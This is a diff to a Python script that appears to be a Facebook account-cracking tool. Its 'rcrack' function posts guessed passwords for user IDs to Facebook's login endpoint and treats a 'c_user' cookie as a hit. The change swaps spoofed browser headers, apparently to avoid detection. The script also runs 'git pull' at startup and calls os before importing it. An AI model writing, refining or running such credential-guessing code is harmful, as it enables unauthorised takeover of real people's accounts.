@@ -1,5 +1,5 @@
 import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
-os.system('git pull')
+os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
@@ -208,26 +208,24 @@ def rcrack(uid,pwx,tl):
 			"email": uid,
 			"pass":ps,#ps
 			"login":"Log In"}
-	        headers = {'authority': 'x.facebook.com',
-            'method': 'POST',
+			header_freefb = {
+		    'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'path': '/',
             'scheme': 'https',
-            'accept': '*/*',
-            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryXcQBvMoGsBzKB4TA',
-            'origin': 'https://x.facebook.com',
-            'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Google Chrome";v="111"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5529.219 Safari/537.36',
-            'x-asbd-id': '198387',
-            'x-fb-lsd': 'AVrieA-i1tk',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',
-            'x_fb_background_state': '1',}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'een-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
